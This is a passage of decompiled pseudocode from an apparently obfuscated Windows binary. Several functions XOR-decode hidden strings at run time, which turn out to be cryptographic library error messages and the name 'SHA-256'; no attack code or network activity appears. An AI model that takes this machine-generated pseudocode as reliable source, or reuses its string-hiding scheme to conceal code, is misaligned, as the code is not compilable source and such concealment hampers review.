  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  v6[6] = 0i64;
  v6[7] = 0i64;
  *((_DWORD *)v6 + 16) = 0;
  *((_WORD *)v6 + 34) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 70i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 70) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DAA90[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x46 );
  return v3;
}
// 1400DAA38: using guessed type int dword_1400DAA38;
// 1400DAA3C: using guessed type int dword_1400DAA3C;
// 1400DAA40: using guessed type int dword_1400DAA40;
// 1400DAA44: using guessed type int dword_1400DAA44;
// 1400DAA87: using guessed type char byte_1400DAA87;
// 1400DAA88: using guessed type int dword_1400DAA88;
// 1400DAA91: using guessed type char byte_1400DAA91;
// 1400DAA92: using guessed type char byte_1400DAA92;
// 1400DAA93: using guessed type char byte_1400DAA93;
// 1400DAA94: using guessed type char byte_1400DAA94;
// 1400DAA95: using guessed type char byte_1400DAA95;
// 1400DAA96: using guessed type char byte_1400DAA96;
// 1400DAA97: using guessed type char byte_1400DAA97;
// 1400DAA98: using guessed type char byte_1400DAA98;
// 1400DAA99: using guessed type char byte_1400DAA99;
// 1400DAA9A: using guessed type char byte_1400DAA9A;
// 1400DAA9B: using guessed type char byte_1400DAA9B;
// 1400DAA9C: using guessed type char byte_1400DAA9C;
// 1400DAA9D: using guessed type char byte_1400DAA9D;
// 1400DAA9E: using guessed type char byte_1400DAA9E;
// 1400DAA9F: using guessed type char byte_1400DAA9F;
// 1400DAAA0: using guessed type char byte_1400DAAA0;
// 1400DAAA1: using guessed type char byte_1400DAAA1;
// 1400DAAA2: using guessed type char byte_1400DAAA2;
// 1400DAAA3: using guessed type char byte_1400DAAA3;
// 1400DAAA4: using guessed type char byte_1400DAAA4;
// 1400DAAA5: using guessed type char byte_1400DAAA5;
// 1400DAAA6: using guessed type char byte_1400DAAA6;
// 1400DAAA7: using guessed type char byte_1400DAAA7;
// 1400DAAA8: using guessed type char byte_1400DAAA8;
// 1400DAAA9: using guessed type char byte_1400DAAA9;
// 1400DAAAA: using guessed type char byte_1400DAAAA;
// 1400DAAAB: using guessed type char byte_1400DAAAB;
// 1400DAAAC: using guessed type char byte_1400DAAAC;
// 1400DAAAD: using guessed type char byte_1400DAAAD;
// 1400DAAAE: using guessed type char byte_1400DAAAE;
// 1400DAAAF: using guessed type char byte_1400DAAAF;
// 1400DAAB0: using guessed type char byte_1400DAAB0;
// 1400DAAB1: using guessed type char byte_1400DAAB1;
// 1400DAAB2: using guessed type char byte_1400DAAB2;
// 1400DAAB3: using guessed type char byte_1400DAAB3;
// 1400DAAB4: using guessed type char byte_1400DAAB4;
// 1400DAAB5: using guessed type char byte_1400DAAB5;
// 1400DAAB6: using guessed type char byte_1400DAAB6;
// 1400DAAB7: using guessed type char byte_1400DAAB7;
// 1400DAAB8: using guessed type char byte_1400DAAB8;
// 1400DAAB9: using guessed type char byte_1400DAAB9;
// 1400DAABA: using guessed type char byte_1400DAABA;
// 1400DAABB: using guessed type char byte_1400DAABB;
// 1400DAABC: using guessed type char byte_1400DAABC;
// 1400DAABD: using guessed type char byte_1400DAABD;
// 1400DAABE: using guessed type char byte_1400DAABE;
// 1400DAABF: using guessed type char byte_1400DAABF;
// 1400DAAC0: using guessed type char byte_1400DAAC0;
// 1400DAAC1: using guessed type char byte_1400DAAC1;
// 1400DAAC2: using guessed type char byte_1400DAAC2;
// 1400DAAC3: using guessed type char byte_1400DAAC3;
// 1400DAAC4: using guessed type char byte_1400DAAC4;
// 1400DAAC5: using guessed type char byte_1400DAAC5;
// 1400DAAC6: using guessed type char byte_1400DAAC6;
// 1400DAAC7: using guessed type char byte_1400DAAC7;
// 1400DAAC8: using guessed type char byte_1400DAAC8;
// 1400DAAC9: using guessed type char byte_1400DAAC9;
// 1400DAACA: using guessed type char byte_1400DAACA;
// 1400DAACB: using guessed type char byte_1400DAACB;
// 1400DAACC: using guessed type char byte_1400DAACC;
// 1400DAACD: using guessed type char byte_1400DAACD;
// 1400DAACE: using guessed type char byte_1400DAACE;
// 1400DAACF: using guessed type char byte_1400DAACF;
// 1400DAAD0: using guessed type char byte_1400DAAD0;
// 1400DAAD1: using guessed type char byte_1400DAAD1;
// 1400DAAD2: using guessed type char byte_1400DAAD2;
// 1400DAAD3: using guessed type char byte_1400DAAD3;
// 1400DAAD4: using guessed type char byte_1400DAAD4;
// 1400DAAD5: using guessed type char byte_1400DAAD5;

//----- (000000014004FF80) ----------------------------------------------------
void **__fastcall sub_14004FF80(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DAAD8;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400DAAD8 & 1 )
  {
    v5 = byte_1400DAAD6;
  }
  else
  {
    v4 = 69069 * dword_1400DAA40 + 1234567;
    v1 = dword_1400DAAD8 | 1;
    dword_1400DAA40 = v4;
    dword_1400DAAD8 |= 1u;
    dword_1400DAA38 = HIWORD(dword_1400DAA38) + 36969 * (unsigned __int16)dword_1400DAA38;
    LOBYTE(v4) = (BYTE2(dword_1400DAA44) + 80 * dword_1400DAA44) ^ v4;
    dword_1400DAA44 = HIWORD(dword_1400DAA44) + 18000 * (unsigned __int16)dword_1400DAA44;
    v5 = (((unsigned int)dword_1400DAA3C >> 13) ^ 32 * dword_1400DAA3C ^ dword_1400DAA3C) + v4;
    dword_1400DAA3C ^= ((unsigned int)dword_1400DAA3C >> 13) ^ 32 * (dword_1400DAA3C ^ (dword_1400DAA3C << 12));
    byte_1400DAAD6 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DAAD8 = v1 | 2;
    byte_1400DAAE0[0] = v5 ^ 0x50;
    byte_1400DAAE1 = (v5 - 1) ^ 0x4B;
    byte_1400DAAE2 = (v5 - 2) ^ 0x5F;
    byte_1400DAAE3 = (v5 - 3) ^ 0x4D;
    byte_1400DAAE4 = (v5 - 4) ^ 0x65;
    byte_1400DAAE5 = (v5 - 5) ^ 0x73;
    byte_1400DAAE6 = (v5 - 6) ^ 0x73;
    byte_1400DAAE7 = (v5 - 7) ^ 0x61;
    byte_1400DAAE8 = (v5 - 8) ^ 0x67;
    byte_1400DAAE9 = (v5 - 9) ^ 0x65;
    byte_1400DAAEA = (v5 - 10) ^ 0x45;
    byte_1400DAAEB = (v5 - 11) ^ 0x6E;
    byte_1400DAAEC = (v5 - 12) ^ 0x63;
    byte_1400DAAED = (v5 - 13) ^ 0x6F;
    byte_1400DAAEE = (v5 - 14) ^ 0x64;
    byte_1400DAAEF = (v5 - 15) ^ 0x69;
    byte_1400DAAF0 = (v5 - 16) ^ 0x6E;
    byte_1400DAAF1 = (v5 - 17) ^ 0x67;
    byte_1400DAAF2 = (v5 - 18) ^ 0x4D;
    byte_1400DAAF3 = (v5 - 19) ^ 0x65;
    byte_1400DAAF4 = (v5 - 20) ^ 0x74;
    byte_1400DAAF5 = (v5 - 21) ^ 0x68;
    byte_1400DAAF6 = (v5 - 22) ^ 0x6F;
    byte_1400DAAF7 = (v5 - 23) ^ 0x64;
    byte_1400DAAF8 = (v5 - 24) ^ 0x3A;
    byte_1400DAAF9 = (v5 - 25) ^ 0x20;
    byte_1400DAAFA = (v5 - 26) ^ 0x74;
    byte_1400DAAFB = (v5 - 27) ^ 0x68;
    byte_1400DAAFC = (v5 - 28) ^ 0x69;
    byte_1400DAAFD = (v5 - 29) ^ 0x73;
    byte_1400DAAFE = (v5 - 30) ^ 0x20;
    byte_1400DAAFF = (v5 - 31) ^ 0x73;
    byte_1400DAB00 = (v5 - 32) ^ 0x69;
    byte_1400DAB01 = (v5 - 33) ^ 0x67;
    byte_1400DAB02 = (v5 - 34) ^ 0x6E;
    byte_1400DAB03 = (v5 - 35) ^ 0x61;
    byte_1400DAB04 = (v5 - 36) ^ 0x74;
    byte_1400DAB05 = (v5 - 37) ^ 0x75;
    byte_1400DAB06 = (v5 - 38) ^ 0x72;
    byte_1400DAB07 = (v5 - 39) ^ 0x65;
    byte_1400DAB08 = (v5 - 40) ^ 0x20;
    byte_1400DAB09 = (v5 - 41) ^ 0x73;
    byte_1400DAB0A = (v5 - 42) ^ 0x63;
    byte_1400DAB0B = (v5 - 43) ^ 0x68;
    byte_1400DAB0C = (v5 - 44) ^ 0x65;
    byte_1400DAB0D = (v5 - 45) ^ 0x6D;
    byte_1400DAB0E = (v5 - 46) ^ 0x65;
    byte_1400DAB0F = (v5 - 47) ^ 0x20;
    byte_1400DAB10 = (v5 - 48) ^ 0x64;
    byte_1400DAB11 = (v5 - 49) ^ 0x6F;
    byte_1400DAB12 = (v5 - 50) ^ 0x65;
    byte_1400DAB13 = (v5 - 51) ^ 0x73;
    byte_1400DAB14 = (v5 - 52) ^ 0x20;
    byte_1400DAB15 = (v5 - 53) ^ 0x6E;
    byte_1400DAB16 = (v5 - 54) ^ 0x6F;
    byte_1400DAB17 = (v5 - 55) ^ 0x74;
    byte_1400DAB18 = (v5 - 56) ^ 0x20;
    byte_1400DAB19 = (v5 - 57) ^ 0x73;
    byte_1400DAB1A = (v5 - 58) ^ 0x75;
    byte_1400DAB1B = (v5 - 59) ^ 0x70;
    byte_1400DAB1C = (v5 - 60) ^ 0x70;
    byte_1400DAB1D = (v5 - 61) ^ 0x6F;
    byte_1400DAB1E = (v5 - 62) ^ 0x72;
    byte_1400DAB1F = (v5 - 63) ^ 0x74;
    byte_1400DAB20 = (v5 - 64) ^ 0x20;
    byte_1400DAB21 = (v5 - 65) ^ 0x6D;
    byte_1400DAB22 = (v5 - 66) ^ 0x65;
    byte_1400DAB23 = (v5 - 67) ^ 0x73;
    byte_1400DAB24 = (v5 - 68) ^ 0x73;
    byte_1400DAB25 = (v5 - 69) ^ 0x61;
    byte_1400DAB26 = (v5 - 70) ^ 0x67;
    byte_1400DAB27 = (v5 - 71) ^ 0x65;
    byte_1400DAB28 = (v5 - 72) ^ 0x20;
    byte_1400DAB29 = (v5 - 73) ^ 0x72;
    byte_1400DAB2A = (v5 - 74) ^ 0x65;
    byte_1400DAB2B = (v5 - 75) ^ 0x63;
    byte_1400DAB2C = (v5 - 76) ^ 0x6F;
    byte_1400DAB2D = (v5 - 77) ^ 0x76;
    byte_1400DAB2E = (v5 - 78) ^ 0x65;
    byte_1400DAB2F = (v5 - 79) ^ 0x72;
    byte_1400DAB30 = (v5 - 80) ^ 0x79;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x51ui64 )
  {
    sub_140004790(Src, 0x51ui64, 0i64);
    v5 = byte_1400DAAD6;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x51ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)81;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 81) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400DAAE0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x51 );
  return v3;
}
// 1400DAA38: using guessed type int dword_1400DAA38;
// 1400DAA3C: using guessed type int dword_1400DAA3C;
// 1400DAA40: using guessed type int dword_1400DAA40;
// 1400DAA44: using guessed type int dword_1400DAA44;
// 1400DAAD6: using guessed type char byte_1400DAAD6;
// 1400DAAD8: using guessed type int dword_1400DAAD8;
// 1400DAAE1: using guessed type char byte_1400DAAE1;
// 1400DAAE2: using guessed type char byte_1400DAAE2;
// 1400DAAE3: using guessed type char byte_1400DAAE3;
// 1400DAAE4: using guessed type char byte_1400DAAE4;
// 1400DAAE5: using guessed type char byte_1400DAAE5;
// 1400DAAE6: using guessed type char byte_1400DAAE6;
// 1400DAAE7: using guessed type char byte_1400DAAE7;
// 1400DAAE8: using guessed type char byte_1400DAAE8;
// 1400DAAE9: using guessed type char byte_1400DAAE9;
// 1400DAAEA: using guessed type char byte_1400DAAEA;
// 1400DAAEB: using guessed type char byte_1400DAAEB;
// 1400DAAEC: using guessed type char byte_1400DAAEC;
// 1400DAAED: using guessed type char byte_1400DAAED;
// 1400DAAEE: using guessed type char byte_1400DAAEE;
// 1400DAAEF: using guessed type char byte_1400DAAEF;
// 1400DAAF0: using guessed type char byte_1400DAAF0;
// 1400DAAF1: using guessed type char byte_1400DAAF1;
// 1400DAAF2: using guessed type char byte_1400DAAF2;
// 1400DAAF3: using guessed type char byte_1400DAAF3;
// 1400DAAF4: using guessed type char byte_1400DAAF4;
// 1400DAAF5: using guessed type char byte_1400DAAF5;
// 1400DAAF6: using guessed type char byte_1400DAAF6;
// 1400DAAF7: using guessed type char byte_1400DAAF7;
// 1400DAAF8: using guessed type char byte_1400DAAF8;
// 1400DAAF9: using guessed type char byte_1400DAAF9;
// 1400DAAFA: using guessed type char byte_1400DAAFA;
// 1400DAAFB: using guessed type char byte_1400DAAFB;
// 1400DAAFC: using guessed type char byte_1400DAAFC;
// 1400DAAFD: using guessed type char byte_1400DAAFD;
// 1400DAAFE: using guessed type char byte_1400DAAFE;
// 1400DAAFF: using guessed type char byte_1400DAAFF;
// 1400DAB00: using guessed type char byte_1400DAB00;
// 1400DAB01: using guessed type char byte_1400DAB01;
// 1400DAB02: using guessed type char byte_1400DAB02;
// 1400DAB03: using guessed type char byte_1400DAB03;
// 1400DAB04: using guessed type char byte_1400DAB04;
// 1400DAB05: using guessed type char byte_1400DAB05;
// 1400DAB06: using guessed type char byte_1400DAB06;
// 1400DAB07: using guessed type char byte_1400DAB07;
// 1400DAB08: using guessed type char byte_1400DAB08;
// 1400DAB09: using guessed type char byte_1400DAB09;
// 1400DAB0A: using guessed type char byte_1400DAB0A;
// 1400DAB0B: using guessed type char byte_1400DAB0B;
// 1400DAB0C: using guessed type char byte_1400DAB0C;
// 1400DAB0D: using guessed type char byte_1400DAB0D;
// 1400DAB0E: using guessed type char byte_1400DAB0E;
// 1400DAB0F: using guessed type char byte_1400DAB0F;
// 1400DAB10: using guessed type char byte_1400DAB10;
// 1400DAB11: using guessed type char byte_1400DAB11;
// 1400DAB12: using guessed type char byte_1400DAB12;
// 1400DAB13: using guessed type char byte_1400DAB13;
// 1400DAB14: using guessed type char byte_1400DAB14;
// 1400DAB15: using guessed type char byte_1400DAB15;
// 1400DAB16: using guessed type char byte_1400DAB16;
// 1400DAB17: using guessed type char byte_1400DAB17;
// 1400DAB18: using guessed type char byte_1400DAB18;
// 1400DAB19: using guessed type char byte_1400DAB19;
// 1400DAB1A: using guessed type char byte_1400DAB1A;
// 1400DAB1B: using guessed type char byte_1400DAB1B;
// 1400DAB1C: using guessed type char byte_1400DAB1C;
// 1400DAB1D: using guessed type char byte_1400DAB1D;
// 1400DAB1E: using guessed type char byte_1400DAB1E;
// 1400DAB1F: using guessed type char byte_1400DAB1F;
// 1400DAB20: using guessed type char byte_1400DAB20;
// 1400DAB21: using guessed type char byte_1400DAB21;
// 1400DAB22: using guessed type char byte_1400DAB22;
// 1400DAB23: using guessed type char byte_1400DAB23;
// 1400DAB24: using guessed type char byte_1400DAB24;
// 1400DAB25: using guessed type char byte_1400DAB25;
// 1400DAB26: using guessed type char byte_1400DAB26;
// 1400DAB27: using guessed type char byte_1400DAB27;
// 1400DAB28: using guessed type char byte_1400DAB28;
// 1400DAB29: using guessed type char byte_1400DAB29;
// 1400DAB2A: using guessed type char byte_1400DAB2A;
// 1400DAB2B: using guessed type char byte_1400DAB2B;
// 1400DAB2C: using guessed type char byte_1400DAB2C;
// 1400DAB2D: using guessed type char byte_1400DAB2D;
// 1400DAB2E: using guessed type char byte_1400DAB2E;
// 1400DAB2F: using guessed type char byte_1400DAB2F;
// 1400DAB30: using guessed type char byte_1400DAB30;

//----- (0000000140050480) ----------------------------------------------------
_QWORD *__fastcall sub_140050480(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DAA4C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DAA4C & 1 )
  {
    v5 = byte_1400DAA48;
  }
  else
  {
    v4 = 69069 * dword_1400DAA40 + 1234567;
    v1 = dword_1400DAA4C | 1;
    dword_1400DAA40 = v4;
    dword_1400DAA4C |= 1u;
    dword_1400DAA38 = HIWORD(dword_1400DAA38) + 36969 * (unsigned __int16)dword_1400DAA38;
    LOBYTE(v4) = (BYTE2(dword_1400DAA44) + 80 * dword_1400DAA44) ^ v4;
    dword_1400DAA44 = HIWORD(dword_1400DAA44) + 18000 * (unsigned __int16)dword_1400DAA44;
    v5 = (((unsigned int)dword_1400DAA3C >> 13) ^ 32 * dword_1400DAA3C ^ dword_1400DAA3C) + v4;
    dword_1400DAA3C ^= ((unsigned int)dword_1400DAA3C >> 13) ^ 32 * (dword_1400DAA3C ^ (dword_1400DAA3C << 12));
    byte_1400DAA48 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DAA4C = v1 | 2;
    byte_1400DAA50[0] = v5 ^ 0x42;
    byte_1400DAA51 = (v5 - 1) ^ 0x75;
    byte_1400DAA52 = (v5 - 2) ^ 0x66;
    byte_1400DAA53 = (v5 - 3) ^ 0x66;
    byte_1400DAA54 = (v5 - 4) ^ 0x65;
    byte_1400DAA55 = (v5 - 5) ^ 0x72;
    byte_1400DAA56 = (v5 - 6) ^ 0x65;
    byte_1400DAA57 = (v5 - 7) ^ 0x64;
    byte_1400DAA58 = (v5 - 8) ^ 0x54;
    byte_1400DAA59 = (v5 - 9) ^ 0x72;
    byte_1400DAA5A = (v5 - 10) ^ 0x61;
    byte_1400DAA5B = (v5 - 11) ^ 0x6E;
    byte_1400DAA5C = (v5 - 12) ^ 0x73;
    byte_1400DAA5D = (v5 - 13) ^ 0x66;
    byte_1400DAA5E = (v5 - 14) ^ 0x6F;
    byte_1400DAA5F = (v5 - 15) ^ 0x72;
    byte_1400DAA60 = (v5 - 16) ^ 0x6D;
    byte_1400DAA61 = (v5 - 17) ^ 0x61;
    byte_1400DAA62 = (v5 - 18) ^ 0x74;
    byte_1400DAA63 = (v5 - 19) ^ 0x69;
    byte_1400DAA64 = (v5 - 20) ^ 0x6F;
    byte_1400DAA65 = (v5 - 21) ^ 0x6E;
    byte_1400DAA66 = (v5 - 22) ^ 0x3A;
    byte_1400DAA67 = (v5 - 23) ^ 0x20;
    byte_1400DAA68 = (v5 - 24) ^ 0x74;
    byte_1400DAA69 = (v5 - 25) ^ 0x68;
    byte_1400DAA6A = (v5 - 26) ^ 0x69;
    byte_1400DAA6B = (v5 - 27) ^ 0x73;
    byte_1400DAA6C = (v5 - 28) ^ 0x20;
    byte_1400DAA6D = (v5 - 29) ^ 0x6F;
    byte_1400DAA6E = (v5 - 30) ^ 0x62;
    byte_1400DAA6F = (v5 - 31) ^ 0x6A;
    byte_1400DAA70 = (v5 - 32) ^ 0x65;
    byte_1400DAA71 = (v5 - 33) ^ 0x63;
    byte_1400DAA72 = (v5 - 34) ^ 0x74;
    byte_1400DAA73 = (v5 - 35) ^ 0x20;
    byte_1400DAA74 = (v5 - 36) ^ 0x64;
    byte_1400DAA75 = (v5 - 37) ^ 0x6F;
    byte_1400DAA76 = (v5 - 38) ^ 0x65;
    byte_1400DAA77 = (v5 - 39) ^ 0x73;
    byte_1400DAA78 = (v5 - 40) ^ 0x6E;
    byte_1400DAA79 = (v5 - 41) ^ 0x27;
    byte_1400DAA7A = (v5 - 42) ^ 0x74;
    byte_1400DAA7B = (v5 - 43) ^ 0x20;
    byte_1400DAA7C = (v5 - 44) ^ 0x61;
    byte_1400DAA7D = (v5 - 45) ^ 0x6C;
    byte_1400DAA7E = (v5 - 46) ^ 0x6C;
    byte_1400DAA7F = (v5 - 47) ^ 0x6F;
    byte_1400DAA80 = (v5 - 48) ^ 0x77;
    byte_1400DAA81 = (v5 - 49) ^ 0x20;
    byte_1400DAA82 = (v5 - 50) ^ 0x69;
    byte_1400DAA83 = (v5 - 51) ^ 0x6E;
    byte_1400DAA84 = (v5 - 52) ^ 0x70;
    byte_1400DAA85 = (v5 - 53) ^ 0x75;
    byte_1400DAA86 = (v5 - 54) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x37ui64 )
  {
    sub_140004790(Src, 0x37ui64, 0i64);
    v5 = byte_1400DAA48;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  *((_DWORD *)v6 + 12) = 0;
  *((_WORD *)v6 + 26) = 0;
  *((_BYTE *)v6 + 54) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 55i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 55) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DAA50[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x37 );
  return v3;
}
// 1400DAA38: using guessed type int dword_1400DAA38;
// 1400DAA3C: using guessed type int dword_1400DAA3C;
// 1400DAA40: using guessed type int dword_1400DAA40;
// 1400DAA44: using guessed type int dword_1400DAA44;
// 1400DAA48: using guessed type char byte_1400DAA48;
// 1400DAA4C: using guessed type int dword_1400DAA4C;
// 1400DAA51: using guessed type char byte_1400DAA51;
// 1400DAA52: using guessed type char byte_1400DAA52;
// 1400DAA53: using guessed type char byte_1400DAA53;
// 1400DAA54: using guessed type char byte_1400DAA54;
// 1400DAA55: using guessed type char byte_1400DAA55;
// 1400DAA56: using guessed type char byte_1400DAA56;
// 1400DAA57: using guessed type char byte_1400DAA57;
// 1400DAA58: using guessed type char byte_1400DAA58;
// 1400DAA59: using guessed type char byte_1400DAA59;
// 1400DAA5A: using guessed type char byte_1400DAA5A;
// 1400DAA5B: using guessed type char byte_1400DAA5B;
// 1400DAA5C: using guessed type char byte_1400DAA5C;
// 1400DAA5D: using guessed type char byte_1400DAA5D;
// 1400DAA5E: using guessed type char byte_1400DAA5E;
// 1400DAA5F: using guessed type char byte_1400DAA5F;
// 1400DAA60: using guessed type char byte_1400DAA60;
// 1400DAA61: using guessed type char byte_1400DAA61;
// 1400DAA62: using guessed type char byte_1400DAA62;
// 1400DAA63: using guessed type char byte_1400DAA63;
// 1400DAA64: using guessed type char byte_1400DAA64;
// 1400DAA65: using guessed type char byte_1400DAA65;
// 1400DAA66: using guessed type char byte_1400DAA66;
// 1400DAA67: using guessed type char byte_1400DAA67;
// 1400DAA68: using guessed type char byte_1400DAA68;
// 1400DAA69: using guessed type char byte_1400DAA69;
// 1400DAA6A: using guessed type char byte_1400DAA6A;
// 1400DAA6B: using guessed type char byte_1400DAA6B;
// 1400DAA6C: using guessed type char byte_1400DAA6C;
// 1400DAA6D: using guessed type char byte_1400DAA6D;
// 1400DAA6E: using guessed type char byte_1400DAA6E;
// 1400DAA6F: using guessed type char byte_1400DAA6F;
// 1400DAA70: using guessed type char byte_1400DAA70;
// 1400DAA71: using guessed type char byte_1400DAA71;
// 1400DAA72: using guessed type char byte_1400DAA72;
// 1400DAA73: using guessed type char byte_1400DAA73;
// 1400DAA74: using guessed type char byte_1400DAA74;
// 1400DAA75: using guessed type char byte_1400DAA75;
// 1400DAA76: using guessed type char byte_1400DAA76;
// 1400DAA77: using guessed type char byte_1400DAA77;
// 1400DAA78: using guessed type char byte_1400DAA78;
// 1400DAA79: using guessed type char byte_1400DAA79;
// 1400DAA7A: using guessed type char byte_1400DAA7A;
// 1400DAA7B: using guessed type char byte_1400DAA7B;
// 1400DAA7C: using guessed type char byte_1400DAA7C;
// 1400DAA7D: using guessed type char byte_1400DAA7D;
// 1400DAA7E: using guessed type char byte_1400DAA7E;
// 1400DAA7F: using guessed type char byte_1400DAA7F;
// 1400DAA80: using guessed type char byte_1400DAA80;
// 1400DAA81: using guessed type char byte_1400DAA81;
// 1400DAA82: using guessed type char byte_1400DAA82;
// 1400DAA83: using guessed type char byte_1400DAA83;
// 1400DAA84: using guessed type char byte_1400DAA84;
// 1400DAA85: using guessed type char byte_1400DAA85;
// 1400DAA86: using guessed type char byte_1400DAA86;

//----- (00000001400508A0) ----------------------------------------------------
__int64 __fastcall sub_1400508A0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 48i64))();
  if ( result )
    result += *(signed int *)(*(_QWORD *)result + 4i64);
  return result;
}

//----- (00000001400508D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400508D0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DAB34;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DAB34 & 1 )
  {
    v5 = byte_1400DAB31;
  }
  else
  {
    v4 = 69069 * dword_1400DAA40 + 1234567;
    v1 = dword_1400DAB34 | 1;
    dword_1400DAA40 = v4;
    dword_1400DAB34 |= 1u;
    dword_1400DAA38 = HIWORD(dword_1400DAA38) + 36969 * (unsigned __int16)dword_1400DAA38;
    LOBYTE(v4) = (BYTE2(dword_1400DAA44) + 80 * dword_1400DAA44) ^ v4;
    dword_1400DAA44 = HIWORD(dword_1400DAA44) + 18000 * (unsigned __int16)dword_1400DAA44;
    v5 = (((unsigned int)dword_1400DAA3C >> 13) ^ 32 * dword_1400DAA3C ^ dword_1400DAA3C) + v4;
    dword_1400DAA3C ^= ((unsigned int)dword_1400DAA3C >> 13) ^ 32 * (dword_1400DAA3C ^ (dword_1400DAA3C << 12));
    byte_1400DAB31 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DAB34 = v1 | 2;
    byte_1400DAB38[0] = v5 ^ 0x53;
    byte_1400DAB39 = (v5 - 1) ^ 0x48;
    byte_1400DAB3A = (v5 - 2) ^ 0x41;
    byte_1400DAB3B = (v5 - 3) ^ 0x2D;
    byte_1400DAB3C = (v5 - 4) ^ 0x32;
    byte_1400DAB3D = (v5 - 5) ^ 0x35;
    byte_1400DAB3E = (v5 - 6) ^ 0x36;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DAB31;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DAB38[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DAA38: using guessed type int dword_1400DAA38;
// 1400DAA3C: using guessed type int dword_1400DAA3C;
// 1400DAA40: using guessed type int dword_1400DAA40;
// 1400DAA44: using guessed type int dword_1400DAA44;
// 1400DAB31: using guessed type char byte_1400DAB31;
// 1400DAB34: using guessed type int dword_1400DAB34;
// 1400DAB39: using guessed type char byte_1400DAB39;
// 1400DAB3A: using guessed type char byte_1400DAB3A;
// 1400DAB3B: using guessed type char byte_1400DAB3B;
// 1400DAB3C: using guessed type char byte_1400DAB3C;
// 1400DAB3D: using guessed type char byte_1400DAB3D;
// 1400DAB3E: using guessed type char byte_1400DAB3E;

//----- (0000000140050AA0) ----------------------------------------------------
signed __int64 __fastcall sub_140050AA0(__int64 a1, unsigned __int64 a2)
{
  signed __int64 result; // rax

  if ( a2 <= 0x20 )
    result = a2 + 7 - (((_BYTE)a2 + 7) & 7);
  else
    result = 32i64;
  return result;
}

//----- (0000000140050AC0) ----------------------------------------------------
char __fastcall sub_140050AC0(__int64 a1, const char *a2, __int64 a3, _QWORD *a4)
{
  void *v4; // rsi
  _QWORD *v5; // rax
